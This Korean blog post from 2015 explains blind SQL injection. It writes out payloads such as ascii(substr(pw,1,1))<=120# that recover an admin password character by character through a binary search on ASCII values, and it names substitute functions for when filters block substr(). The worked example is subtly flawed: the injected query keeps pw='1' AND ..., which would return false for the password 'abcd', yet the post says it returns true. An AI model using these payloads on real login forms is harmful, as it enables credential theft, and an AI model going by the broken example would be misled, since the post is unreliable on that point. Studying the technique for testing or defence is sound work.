---
layout: post
title: Blind SQL Injection 
date: 2015-08-24 13:42:00 +0900
category: Hacking 
---
Blind SQL Injection은 말 그대로 Blind 못보는 상태에서 '때려맞추는' 것이다.

만약 로그인을 할때 아이디와 패스워드를 모두 비교한다면 어떨까?



```
select * from user where id='$id' and pw='$pw';
```


후에 결과값을 받은 배열에서 
```
row['id']==$id && row['pw']==$pw
```
이렇게 비교를 하게 된다면 ' or '1'='1 같은 논리적 SQL Injection은 먹히지 않게 된다.



이떄 비밀번호의 문자열을 때려맞추는 것이 Blind SQL Injection이다


```
select * from user where id='admin' and pw='1' AND ascii(substr(pw,1,1))<=120#';
```


이렇게 된다면 쿼리문의 내용은 

아이디가 admin이면서 pw의 첫번째 값이 아스키 값으로 120이하라면 참이라는 결과를 반환한다.





ascii()라는 함수는 해당 문자의 아스키 값을 반환하고

substr(컬럼,시작 문자의 자릿수, 가져올 문자의 수)

만약 pw가  abcd라면 substr(pw,2,1) 은 pw에서 2번쨰 자리에서 1글자 만큼 가져오라는 뜻이다.

물론 대부분의 사이트들은 substr()이나   substring()같은 함수를 막기 떄문에 

left(), mid(), right() 같이 문자열에 접근 할 수 있는 다양한 함수들을 사용한다. 





자 pw가 abcd라고 친다면 
```
select * from user where id='admin' and pw='1' AND ascii(substr(pw,1,1))<=120#';
```
하면 참이 나온다. 

이럴땐 과감하게 반으로 자른다.


```
select * from user where id='admin' and pw='1' AND ascii(substr(pw,1,1))<=60#';
```
거짓이 나온다 즉 아스키값 60보다는 크다는 이야기


```
select * from user where id='admin' and pw='1' AND ascii(substr(pw,1,1))<=100#';
```
참이 나온다 100보다 작다고 나온다.


```
select * from user where id='admin' and pw='1' AND ascii(substr(pw,1,1))<=97#';
```
이렇게 하나하나 참과 거짓을 비교해가며 찾는것이 Blind SQL Injection이다. 

물론  Blind SQL Injection을 막기 위해 엄청난게 많은 함수를 필터링 하지만 

웹 해커들은 별에 별 함수를 다 이용해서 뚫는다. 이때 사용되는 함수들에 대해서는 후에 다시 한번 추가 하겠습니다.



